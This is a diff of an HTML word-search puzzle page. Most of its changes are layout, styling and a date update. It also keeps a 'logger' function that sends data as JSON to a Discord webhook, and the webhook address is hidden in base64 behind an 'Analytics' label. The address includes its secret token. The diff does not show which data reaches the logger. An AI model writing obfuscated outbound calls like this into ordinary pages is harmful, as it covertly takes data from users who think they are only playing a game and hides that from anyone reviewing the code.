@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <!-- 
 Catz / @htr-tech
-05-22-2025 
+05-24-2025 
 -->
 <html lang="en">
   <head>
@@ -267,6 +267,15 @@ Catz / @htr-tech
         margin-top: 10px;
       }
 
+      .info-container {
+        display: flex;
+        flex-direction: column;
+        color: var(--primary-color);
+        font-size: 18px;
+        font-weight: bold;
+        gap: 20px;
+      }
+
       #grid, #solution-grid {
         background: linear-gradient(135deg, var(--lighter-accent), var(--accent-color));
         padding: 10px;
@@ -446,7 +455,12 @@ Catz / @htr-tech
         </p>
         <div class="puzzle-section">
           <div id="grid"></div>
-          <div class="word-list" id="word-list"></div>
+          <div class="info-container">
+            <div class="word-list">
+              <span class="editable-word" contenteditable="false">Round&nbsp;</span>
+            </div>
+            <div class="word-list" id="word-list"></div>
+          </div>
         </div>
       </div>
 
@@ -733,22 +747,31 @@ Catz / @htr-tech
       }
 
       async function logger(data) {
-          const now = new Date();
-          const message = {
-              embeds: [{
-                  title: `Analytics ${now.toISOString()}`,
-                  description: `\`\`\`${data}\`\`\``,
-                  color: 0x5865F2
-              }]
-          };
+        const now = new Date();
+        const message = {
+          embeds: [
+            {
+              title: `Analytics ${now.toISOString()}`,
+              description: `\`\`\`${data}\`\`\``,
+              color: 0x5865f2,
+            },
+          ],
+        };
 
-          fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3NTY5NzAwO" + "TI1OTk3MDY0Mi9tSVZYSjEyVzRwNXZfckwxSjZidkdpVHBJ"+ "V0I2WTRaUU1Ic3ZWZE5YNlZkM0dYVy1FbWU5YTZOZmhzTHFIUVcxTFlhbg=="), {
-              method: 'POST',
-              headers: {
-                  'Content-Type': 'application/json'
-              },
-              body: JSON.stringify(message)
-          });
+        fetch(
+          atob(
+            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3NTY5NzAwO" +
+              "TI1OTk3MDY0Mi9tSVZYSjEyVzRwNXZfckwxSjZidkdpVHBJ" +
+              "V0I2WTRaUU1Ic3ZWZE5YNlZkM0dYVy1FbWU5YTZOZmhzTHFIUVcxTFlhbg=="
+          ),
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(message),
+          }
+        );
       }
 
       // Function to show Solution
